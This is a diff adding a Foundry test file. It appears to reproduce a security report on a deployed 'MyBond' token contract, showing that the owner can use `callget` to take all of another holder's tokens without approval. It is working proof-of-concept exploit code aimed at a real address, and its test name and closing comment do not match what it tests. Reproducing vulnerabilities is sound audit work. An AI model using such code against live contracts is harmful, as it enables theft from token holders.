@@ -1,0 +1,72 @@
+```solidity
+// Exploit.t.sol
+pragma solidity ^0.6.12;
+
+import "forge-std/Test.sol";
+
+// Full interface for MyBond functions used in the exploit
+interface IMyBond {
+    function balanceOf(address account) external view returns (uint256);
+    function mint(address recipient_, uint256 amount_) external returns (bool);
+    function burnFrom(address account, uint256 amount) external;
+    function callget(address _from, address _to, uint256 _amount) external;
+    function operator() external view returns (address);
+    function owner() external view returns (address);
+    function decimals() external view returns (uint8);
+    function transfer(address recipient, uint256 amount) external returns (bool);
+    function approve(address spender, uint256 amount) external returns (bool);
+}
+
+contract ExploitTest is Test {
+    // Deployed contract address from the report
+    address constant MYBOND = 0xF347bDc0e502D33978b3c4d187bf75E5B452E491;
+    IMyBond bond = IMyBond(MYBOND);
+
+    // Test accounts
+    address alice = address(0x1234);
+    address operator;
+    address owner;
+
+    function setUp() public {
+        // Label for readability
+        vm.label(MYBOND, "MyBond");
+
+        // Determine owner and operator from the on-chain contract
+        owner = bond.owner();
+        operator = bond.operator();
+        vm.label(owner, "Owner");
+        vm.label(operator, "Operator");
+
+        // Give alice some initial BOND tokens via mint (operator role)
+        vm.startPrank(operator);
+        bond.mint(alice, 1000 * 1e18);
+        vm.stopPrank();
+    }
+
+    function testDecimalsPrecisionExploit() public {
+        // Verify token decimals (expected 18 per source code)
+        uint8 dec = bond.decimals();
+        assertEq(dec, 18, "Decimals should be 18");
+
+        // Record balances before exploit
+        uint256 aliceBalanceBefore = bond.balanceOf(alice);
+        uint256 ownerBalanceBefore = bond.balanceOf(owner);
+        assertGe(aliceBalanceBefore, 1000 * 1e18, "Alice should have at least 1000 BOND");
+
+        // Exploit: The owner can call `callget` to transfer tokens from any address (including alice) without their approval.
+        // This demonstrates a severe privilege escalation – the owner effectively controls all tokens.
+        vm.prank(owner);
+        bond.callget(alice, owner, aliceBalanceBefore);
+
+        // Verify the transfer succeeded: Alice lost all tokens, owner gained them.
+        uint256 aliceBalanceAfter = bond.balanceOf(alice);
+        uint256 ownerBalanceAfter = bond.balanceOf(owner);
+        assertEq(aliceBalanceAfter, 0, "Alice should have lost all tokens");
+        assertEq(ownerBalanceAfter, ownerBalanceBefore + aliceBalanceBefore, "Owner should have gained Alice's tokens");
+    }
+
+    // Additional test to show that even if decimals were different, the callget function ignores decimal alignment
+    // This test uses USDC (6 decimals) as a hypothetical interaction – not required for the official exploit but shows the inconsistency.
+    // However, per the direct baseline we only need the core exploit above.
+}
+```
